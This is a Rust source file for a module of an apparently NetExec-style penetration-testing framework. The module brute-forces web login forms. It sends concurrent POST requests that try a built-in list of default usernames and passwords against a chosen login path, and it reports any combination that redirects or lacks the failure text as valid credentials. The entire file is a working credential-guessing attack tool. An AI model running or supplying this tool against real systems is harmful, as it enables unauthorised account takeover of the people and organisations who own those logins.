use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_auth::Credentials;
use nxc_protocols::{http::HttpSession, NxcSession};
use serde_json::json;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tracing::info;

pub struct WebAuthBrute {}

impl WebAuthBrute {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for WebAuthBrute {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for WebAuthBrute {
    fn name(&self) -> &'static str {
        "web_auth_brute"
    }

    fn description(&self) -> &'static str {
        "Brute forces custom HTML login forms and API endpoints."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["http"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "PATH".to_string(),
                description: "Login path (e.g. /login.php)".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "USER_FIELD".to_string(),
                description: "The POST form parameter name for username".to_string(),
                required: false,
                default: Some("username".to_string()),
            },
            ModuleOption {
                name: "PASS_FIELD".to_string(),
                description: "The POST form parameter name for password".to_string(),
                required: false,
                default: Some("password".to_string()),
            },
            ModuleOption {
                name: "FAIL_TEXT".to_string(),
                description: "Text expected in response body on failure".to_string(),
                required: false,
                default: Some("Invalid".to_string()),
            },
            ModuleOption {
                name: "THREADS".to_string(),
                description: "Concurrent attempts".to_string(),
                required: false,
                default: Some("20".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let http_sess = session
            .as_any_mut()
            .downcast_mut::<HttpSession>()
            .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;

        let scheme = if http_sess.use_ssl { "https" } else { "http" };
        let path = opts.get("PATH").ok_or_else(|| anyhow!("PATH is required"))?;
        let user_field =
            opts.get("USER_FIELD").map(std::string::String::as_str).unwrap_or("username");
        let pass_field =
            opts.get("PASS_FIELD").map(std::string::String::as_str).unwrap_or("password");
        let fail_text = opts.get("FAIL_TEXT").map(std::string::String::as_str).unwrap_or("Invalid");
        let threads = opts.get("THREADS").and_then(|s| s.parse::<usize>().ok()).unwrap_or(20);

        let url = format!("{}://{}:{}{}", scheme, http_sess.target, http_sess.port, path);

        // Small built-in common list, in a real scenario this should combine with global creds logic
        let default_users = vec!["admin", "root", "user", "test", "administrator"];
        let default_passwords =
            vec!["admin", "password", "123456", "12345678", "admin123", "root", "password123"];

        info!("Starting Web Auth Brute towards {} (Threads: {})", url, threads);

        let sem = Arc::new(Semaphore::new(threads));
        let mut tasks = Vec::new();

        for u in &default_users {
            for p in &default_passwords {
                let permit = sem
                    .clone()
                    .acquire_owned()
                    .await
                    .unwrap_or_else(|_| panic!("Failed to acquire semaphore"));
                let client = http_sess.client.clone();
                let username = u.to_string();
                let password = p.to_string();
                let target_url = url.clone();
                let u_f = user_field.to_string();
                let p_f = pass_field.to_string();
                let f_t = fail_text.to_string();

                tasks.push(tokio::spawn(async move {
                    let form_body = format!("{u_f}={username}&{p_f}={password}");

                    let req = client
                        .post(&target_url)
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .body(form_body);

                    let res = req.send().await;
                    drop(permit);

                    match res {
                        Ok(response) => {
                            let status = response.status();
                            // If it redirects, it often implies a successful login drop
                            if status.is_redirection() {
                                return Some((
                                    username,
                                    password,
                                    "Success (Redirect)".to_string(),
                                ));
                            }

                            if let Ok(body) = response.text().await {
                                if !body.contains(&f_t) {
                                    // If failure text is NOT found, we assume success
                                    return Some((
                                        username,
                                        password,
                                        "Success (No fail text)".to_string(),
                                    ));
                                }
                            }
                            None
                        }
                        Err(_) => None,
                    }
                }));
            }
        }

        let mut output = String::from("Brute Force Results:\n");
        let mut successful = Vec::new();
        let mut credentials_list = Vec::new();

        for task in tasks {
            if let Ok(Some((username, password, reason))) = task.await {
                output.push_str(&format!("  [+] VALID: {username}:{password} - {reason}\n"));
                successful.push(json!({"username": username, "password": password}));
                credentials_list.push(Credentials {
                    username,
                    password: Some(password),
                    domain: None,
                    nt_hash: None,
                    lm_hash: None,
                    aes_128_key: None,
                    aes_256_key: None,
                    ccache_path: None,
                    pfx_path: None,
                    use_kerberos: false,
                });
            }
        }

        if successful.is_empty() {
            output.push_str("  [-] No valid credentials found.\n");
        }

        Ok(ModuleResult {
            success: !successful.is_empty(),
            output,
            data: json!({ "valid_accounts": successful }),
            credentials: credentials_list,
        })
    }
}
